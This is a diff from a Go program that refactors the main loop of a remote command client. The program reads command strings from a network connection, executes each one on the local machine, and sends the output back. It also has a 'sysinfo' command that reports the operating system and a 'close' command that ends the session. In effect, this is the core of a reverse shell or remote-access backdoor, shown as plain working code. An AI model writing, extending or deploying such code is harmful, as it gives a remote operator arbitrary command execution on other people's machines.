@@ -19,26 +19,24 @@ func main() {
 		log.Fatal("Connection failled with", err)
 	}
 
-	for {
+	cmd := ""
 
-		cmd, _ := bufio.NewReader(conn).ReadString('\n')
+	for cmd != "close" {
+
+		cmd, _ = bufio.NewReader(conn).ReadString('\n')
 		cmd = strings.TrimSuffix(cmd, "\n")
 		cmd = strings.TrimSuffix(cmd, "\n")
-
-		if strings.Compare(cmd, "close") == 0 {
+			
+	
+		switch {
+		case cmd == "close":
 			break
-		}
 
-		if strings.Compare(cmd, "sysinfo") == 0 {
-			var osType string
-			if runtime.GOOS == "windows" {
-				osType = "The client OS is windows"
-			} else {
-				osType = "The client OS is Unix based"
-			}
+		case cmd == "sysinfo":
+			osType := runtime.GOOS
 			fmt.Fprintf(conn, osType)
 
-		} else {
+		default:
 			out, err := exec.Command(cmd).Output()
 		
 			if err != nil {
@@ -47,7 +45,7 @@ func main() {
 
 			output := string(out[:])
 			fmt.Fprintf(conn, output)
-		}
+		}	
 	}
 	conn.Close()
 }
